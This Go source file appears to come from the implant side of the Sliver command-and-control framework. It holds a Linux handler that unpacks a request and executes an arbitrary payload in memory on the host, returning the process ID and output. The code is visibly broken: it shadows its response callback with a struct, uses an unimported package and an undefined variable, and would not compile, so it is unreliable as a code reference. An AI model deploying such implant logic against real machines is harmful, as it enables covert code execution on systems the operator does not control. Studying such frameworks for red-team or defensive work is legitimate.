//go:build cgo && linux

package handlers

import (
	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
	"google.golang.org/protobuf/proto"
)

func executeInMemoryHandler(data []byte, resp RPCResponse) {
	var req sliverpb.ExecuteInMemoryReq
	err := proto.Unmarshal(data, &req)
	if err != nil {
		resp([]byte{}, err)
		return
	}
	resp := &sliverpb.Execute{}
	output, pid, err := taskrunner.ExecuteInMemory(req.Data, req.Args)
	if err != nil || pid == 0 {
		resp.Response = &commonpb.Response{
			Err: fmt.Sprintf("%s", err),
		}
		proto.Marshal(execResp)
		resp(data, err)
		return
	}
	resp.Response = &commonpb.Response{}
	resp.Pid = pid
	resp.Stdout = output
	resp.Status = 0
	data, err = proto.Marshal(resp)
	resp(data, err)
}
